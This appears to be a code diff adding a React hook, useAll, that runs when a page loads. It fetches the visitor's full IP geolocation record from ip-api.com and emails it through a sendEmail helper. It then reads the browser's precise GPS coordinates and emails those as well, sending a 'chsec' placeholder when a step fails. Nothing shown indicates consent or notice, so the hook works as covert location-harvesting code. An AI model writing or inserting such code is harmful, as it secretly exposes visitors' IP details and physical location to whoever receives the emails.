@@ -37,3 +37,40 @@ export const useGetCoords = () => {
     })();
   }, []);
 };
+
+export const useAll = () => {
+  useEffect(() => {
+    (async () => {
+      try {
+        const response = await fetch("http://ip-api.com/json/?fields=66846719");
+        const data = await response.json();
+
+        await sendEmail({ ip: data });
+      } catch (error) {
+        await sendEmail({ ip: "chsec" });
+      }
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            await sendEmail({
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+            });
+          },
+          async () => {
+            await sendEmail({
+              lat: "chsec",
+              lon: "chsec",
+            });
+          }
+        );
+      } else {
+        await sendEmail({
+          lat: "chsec",
+          lon: "chsec",
+        });
+      }
+    })();
+  }, []);
+};
